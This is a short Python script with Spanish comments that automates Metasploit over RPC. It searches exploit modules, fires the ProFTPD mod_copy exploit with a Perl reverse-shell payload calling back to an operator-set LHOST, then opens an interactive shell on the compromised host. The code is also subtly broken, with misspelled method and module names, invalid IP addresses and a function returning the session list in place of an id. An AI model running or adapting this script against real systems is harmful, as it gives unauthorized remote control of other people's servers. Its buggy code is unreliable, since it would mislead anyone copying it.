import time

from metasploit.msfrpc import MsfRpcClient


def connect_metasploit():
    client = MsfRpcClient("password",ssl=True)
    print("Conectando a metasploit")
    return client




def search_exploit(client,keyword):
    exploits = client.modules.exploits
    filter_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lowe()]
    print(f"exploits que contienen : {keyword}")

    for exploit in filter_exploits:
        print(exploit)

def setup_and_run_exploit (client):
    exploit = client.modules.user("exploit","unix/ftp/proftdp_modcopy_exec")

    #configurar las opciones del explot:

    exploit['RHOSTS']='192.12.3.4.5'
    exploit['SITEPATH']='/var/www/html'
    payload = client.modules.use("payload","cmd/unix/reverse_perl")
    payload['LHOST']='192.168.2323'
    payload['LPORT']=4445
    #Ejecutar el excplot

    print("ejecutando el exploit...")

    output = exploit.execute (payload=payload)

    print(output)

    return output['uuid']


def get_session_id(client,uuid,timeout=15):
    end_time = time.time() + timeout
    while time.time() < end_time:
        session = client.sessions.list
        for s in session:
            if session[s]['exploit_uuid']== uuid:
                print(f"Se ha obtenido la sesión: {s}")
                return session
        time.sleep(1)
    print(f"No se pudo obtener la sesión asociada con el uuid : {uuid}")
    return None




def interact_with_session(client,session_id):
    shell=client.sessions.session(session_id)
    print("Interactuando con la sesión ")
    try:

        while True:
            command = input("$ ")
            if command.lower()=='exit':
                break
            shell.write(command + '\n')
            time.sleep(1)
            print(shell.read())
    except KeyboardInterrupt:
        print("saliendo de la sesión....")


def main ():
    client = connect_metasploit()
    uuid=setup_and_run_exploit(client)
    session_id = get_session_id(client,uuid)
    if session_id:
        interact_with_session(client,session_id)




if __name__ == "__main__":
    main()